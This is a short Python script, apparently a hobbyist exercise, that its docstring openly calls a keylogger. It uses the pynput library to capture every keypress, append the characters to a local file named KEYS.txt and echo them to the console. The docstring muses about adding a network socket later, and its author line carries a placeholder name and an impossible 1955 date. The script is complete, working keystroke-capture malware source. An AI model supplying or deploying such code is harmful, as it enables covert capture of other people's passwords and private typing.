'''
Author: John Doe; Date: November 5th, 1955

This is a simple keylogger that will write keystrokes to an output file or the console
An addition could be a socket above port 1023.

For some unwieldy reason, this code exits when ctrl-` is pressed, which might be the single
least likely keyboard sequence known to man. Whatever, ctrl-C wasn't working. Maybe it is just 
because we are in vscode and that is a shortcut?

'''

import sys
from pynput import keyboard
import os

def on_key_press(key):
    with open('KEYS.txt', 'a') as file:
        try:
            if isinstance(key, keyboard.KeyCode):
                print(f'Key Pressed: {key.char}')
                file.write(key.char)
            elif key == keyboard.Key.space:
                file.write(" ")
        except AttributeError:
            placeHolder56 = '*'
            file.write(placeHolder56) 
        except KeyboardInterrupt:
            exit(0)

if os.path.isfile('.\\KEYS.txt'):
    os.remove('.\\KEYS.txt')

listener = keyboard.Listener(on_press=on_key_press)
listener.start()

try:
    listener.join()
except KeyboardInterrupt:
    listener.stop()
    sys.exit(0)